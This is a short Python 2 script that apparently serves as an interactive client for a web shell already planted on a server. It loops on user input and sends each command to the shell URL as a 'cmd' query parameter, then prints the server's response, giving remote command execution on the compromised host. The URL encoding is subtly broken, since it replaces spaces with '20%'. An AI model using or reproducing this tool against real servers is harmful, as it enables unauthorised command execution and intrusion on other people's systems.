import urllib,sys
import requests
shell = sys.argv[1]
host = shell.split("/")[2]
while True:
    command = raw_input("cmd@{0}~#".format(host))
    req1 = str("{0}?cmd={1}".format(shell,command)).replace(" ","20%")
    request = urllib.urlopen(req1)
    print request.read() 
